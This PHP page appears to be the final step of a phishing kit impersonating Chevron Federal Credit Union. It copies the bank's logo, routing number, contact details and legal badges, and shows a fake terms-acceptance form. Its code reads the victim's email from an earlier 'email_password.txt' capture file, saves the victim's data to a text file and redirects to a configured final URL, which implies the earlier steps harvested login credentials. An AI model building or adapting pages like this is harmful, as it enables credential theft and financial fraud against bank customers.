<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $isChecked = isset($_POST['agree']);
    
    // Validation
    if (!$isChecked) {
        $errors['agree'] = 'Please agree to the terms before continuing.';
    }
    
    if (empty($errors)) {
        // Get user email from previous step for completion message
        $userData = getUserData('email_password.txt', $username);
        $userEmail = 'N/A';
        if (!empty($userData)) {
            $userEmail = $userData[0]['usr_eml'] ?? 'N/A';
        }
        
        // Save to test file
        $data = [
            'step' => 'terms_acceptance',
            'usrnm' => $username,
            'terms_accepted' => $isChecked,
            'usr_eml' => $userEmail,
            'completed_at' => date('Y-m-d H:i:s')
        ];
        
        saveUserData('terms_acceptance.txt', $data);
        
        // Redirect to final URL
        header('Location: ' . FINAL_REDIRECT_URL);
        exit;
    }
}

$supportLinks = ['Forgot User ID', 'Forgot Password', 'Unlock Account'];

$complianceBadges = [
    [
        'title' => 'EQUAL HOUSING LENDER',
        'description' => 'We do business in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act.'
    ],
    [
        'title' => 'NCUA',
        'description' => 'Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government.'
    ]
];

$referenceColumns = [
    [
        'heading' => 'ROUTING NUMBER',
        'lines' => ['#321075947']
    ],
    [
        'heading' => 'PHONE NUMBER',
        'lines' => ['800-232-8101', '24-hour service']
    ],
    [
        'heading' => 'LINKS',
        'lines' => ['Privacy Policy', 'Accessibility', 'Disclosures', 'Security Policy', 'ATM and Branch Locations', 'Rates']
    ],
    [
        'heading' => 'MAILING ADDRESS',
        'lines' => ['Chevron Federal Credit Union', 'PO Box 4107', 'Concord, CA 94524']
    ]
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chevron Federal Credit Union - Terms and Conditions</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white text-[#0e2f56] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1">
            <!-- Blue Gradient Section with Login Card -->
            <section class="bg-gradient-to-r from-[#002c5c] via-[#014a90] to-[#0073ba] py-12 px-4">
                <div class="max-w-5xl mx-auto">
                    <!-- Header Logo -->
                    <div class="flex items-center gap-4 mb-8">
                        <img
                            src="assets/header_logo_bg.png"
                            alt="Chevron Federal Credit Union"
                            class="h-16 w-auto"
                        />
                    </div>

                    <!-- Two Column Card -->
                    <div class="bg-gradient-to-b from-[#f0f6fb] to-[#dfeef9] shadow-2xl rounded-sm flex flex-col md:flex-row">
                        <!-- Left Column: Terms Info -->
                        <div class="order-2 md:order-1 w-full md:w-5/12 px-8 py-10 border-t md:border-t-0 md:border-r border-[#91c1e4]">
                            <p class="text-2xl font-semibold text-[#0b5da7] mb-2">
                                Terms & Conditions
                            </p>
                            <p class="text-sm text-[#0e2f56] mb-4">
                                Please review and accept our terms and conditions to complete your account setup. This agreement governs your use of Chevron Federal Credit Union's digital banking services.
                            </p>
                            <div class="bg-blue-50 border border-blue-200 rounded-sm p-3">
                                <p class="text-xs text-blue-800 font-semibold">
                                    📄 By accepting, you agree to be bound by these terms
                                </p>
                            </div>
                        </div>

                        <!-- Right Column: Terms Form -->
                        <div class="order-1 md:order-2 w-full md:w-7/12 px-8 py-10">
                            <div class="flex flex-col md:flex-row md:items-center gap-4 mb-8">
                                <h2 class="text-lg font-semibold tracking-wide uppercase text-[#0e2f56]">
                                    Final Step
                                </h2>
                                <span class="hidden md:block h-8 w-px bg-[#9cc5e3]"></span>
                                <div class="text-sm text-[#0b5da7">Step 6 of 6</div>
                            </div>

                            <?php if (!empty($errors)): ?>
                                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                                    <div class="flex">
                                        <div class="flex-shrink-0">
                                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                Please fix the following errors:
                                                <ul class="list-disc pl-5 mt-1">
                                                    <?php foreach ($errors as $error): ?>
                                                        <li><?php echo htmlspecialchars($error); ?></li>
                                                    <?php endforeach; ?>
                                                </ul>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <form method="POST" action="" class="space-y-6">
                                <!-- Terms and Conditions -->
                                <div class="space-y-4">
                                    <h3 class="text-sm font-semibold text-[#0e2f56] uppercase tracking-wide">Terms and Conditions</h3>
                                    
                                    <div class="bg-white border border-gray-300 rounded-sm p-4 h-64 overflow-y-auto text-xs text-gray-700 space-y-3">
                                        <h4 class="font-semibold text-sm">1. Account Agreement</h4>
                                        <p>By opening and using this Chevron Federal Credit Union account, you agree to be bound by the terms and conditions outlined in this agreement. This agreement governs your use of all digital banking services, including online banking, mobile banking, and related services.</p>
                                        
                                        <h4 class="font-semibold text-sm">2. Privacy and Security</h4>
                                        <p>We are committed to protecting your personal and financial information. Our privacy policy outlines how we collect, use, and safeguard your data. You agree to maintain the confidentiality of your login credentials and immediately notify us of any unauthorized access to your account.</p>
                                        
                                        <h4 class="font-semibold text-sm">3. Electronic Communications</h4>
                                        <p>You consent to receive electronic communications from Chevron Federal Credit Union, including statements, notices, and other required disclosures. These communications will be sent to the email address you have provided.</p>
                                        
                                        <h4 class="font-semibold text-sm">4. Account Responsibilities</h4>
                                        <p>You are responsible for maintaining accurate account information, including your email address and contact details. You must notify us promptly of any changes to your personal information or if you suspect fraudulent activity on your account.</p>
                                        
                                        <h4 class="font-semibold text-sm">5. Service Availability</h4>
                                        <p>While we strive to provide uninterrupted service, we cannot guarantee 100% availability of our digital banking services. We reserve the right to temporarily suspend services for maintenance, security updates, or other operational requirements.</p>
                                        
                                        <h4 class="font-semibold text-sm">6. Fees and Charges</h4>
                                        <p>Certain digital banking services may be subject to fees. Any applicable fees will be disclosed in our current fee schedule. You authorize Chevron Federal Credit Union to charge any applicable fees to your account.</p>
                                        
                                        <h4 class="font-semibold text-sm">7. Limitation of Liability</h4>
                                        <p>Chevron Federal Credit Union shall not be liable for any indirect, incidental, or consequential damages arising from your use of our digital banking services, except as prohibited by applicable law.</p>
                                        
                                        <h4 class="font-semibold text-sm">8. Termination</h4>
                                        <p>You may terminate your use of digital banking services at any time by contacting us. We reserve the right to terminate your access to digital banking services for violation of these terms or for other legitimate business reasons.</p>
                                        
                                        <h4 class="font-semibold text-sm">9. Governing Law</h4>
                                        <p>This agreement shall be governed by and construed in accordance with the laws of the state in which Chevron Federal Credit Union is located, without regard to conflict of law principles.</p>
                                        
                                        <h4 class="font-semibold text-sm">10. Agreement to Terms</h4>
                                        <p>By checking the acceptance box below and clicking "Complete Setup," you acknowledge that you have read, understood, and agree to be bound by these terms and conditions.</p>
                                    </div>
                                </div>

                                <!-- Terms Acceptance -->
                                <div class="space-y-2">
                                    <div class="flex items-start gap-3">
                                        <input
                                            id="agree"
                                            name="agree"
                                            type="checkbox"
                                            value="1"
                                            class="mt-1 border border-gray-400 bg-white focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                            <?php echo (isset($_POST['agree'])) ? 'checked' : ''; ?>
                                        />
                                        <label for="agree" class="text-sm text-[#0e2f56]">
                                            I have read and agree to the Terms and Conditions outlined above. I understand that by accepting these terms, I am entering into a legally binding agreement with Chevron Federal Credit Union.
                                        </label>
                                    </div>
                                    <?php if (isset($errors['agree'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['agree']); ?>
                                        </p>
                                    <?php endif; ?>
                                </div>

                                <!-- Submit Button -->
                                <div class="pt-4">
                                    <button
                                        type="submit"
                                        class="w-full md:w-auto bg-[#003e7d] text-white font-semibold px-7 py-2 text-sm rounded-sm shadow hover:bg-[#002c5c] disabled:opacity-70"
                                    >
                                        Complete Setup
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Compliance and Reference Information Section -->
            <section class="py-10 px-4">
                <div class="max-w-5xl mx-auto space-y-10 text-sm text-[#0e2f56]">
                    <!-- Compliance Badges -->
                    <div class="grid gap-6 md:grid-cols-2">
                        <?php foreach ($complianceBadges as $badge): ?>
                            <div class="border border-gray-200 rounded-sm p-5 shadow-sm bg-white">
                                <p class="font-semibold text-xs tracking-wide text-gray-700 mb-2 uppercase">
                                    <?php echo htmlspecialchars($badge['title']); ?>
                                </p>
                                <p class="text-sm text-gray-600 leading-relaxed">
                                    <?php echo htmlspecialchars($badge['description']); ?>
                                </p>
                            </div>
                        <?php endforeach; ?>
                    </div>

                    <!-- Reference Information Grid -->
                    <div class="grid gap-8 md:grid-cols-4">
                        <?php foreach ($referenceColumns as $column): ?>
                            <div class="space-y-2">
                                <p class="text-xs font-semibold tracking-wide text-gray-600 uppercase">
                                    <?php echo htmlspecialchars($column['heading']); ?>
                                </p>
                                <div class="space-y-1 text-sm text-gray-700">
                                    <?php foreach ($column['lines'] as $line): ?>
                                        <p><?php echo htmlspecialchars($line); ?></p>
                                    <?php endforeach; ?>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </section>
        </main>

        <!-- Footer -->
        <footer class="border-t border-gray-200">
            <div class="max-w-5xl mx-auto px-4 py-6 flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                <div class="flex items-center justify-center md:justify-start gap-4">
                    <img
                        src="assets/equal-housing.png"
                        alt="Equal Housing Lender"
                        class="h-12 w-auto"
                    />
                    <img
                        src="assets/ncua.png"
                        alt="National Credit Union Administration"
                        class="h-12 w-auto"
                    />
                </div>
                <div class="text-xs text-gray-600 text-center md:text-right space-y-1">
                    <p>© 2025 Chevron Federal Credit Union</p>
                    <p>Version: 10.34.20250707.705.AWS</p>
                </div>
            </div>
        </footer>

        <!-- Help Button -->
        <button
            type="button"
            class="fixed bottom-6 right-6 inline-flex items-center gap-2 rounded-full bg-[#009a66] px-5 py-3 text-sm font-semibold text-white shadow-lg hover:bg-[#007a50]"
        >
            <span class="inline-flex items-center justify-center h-5 w-5 rounded-full bg-white text-[#009a66] text-xs font-bold">
                ?
            </span>
            Help
        </button>
    </div>
</body>
</html>
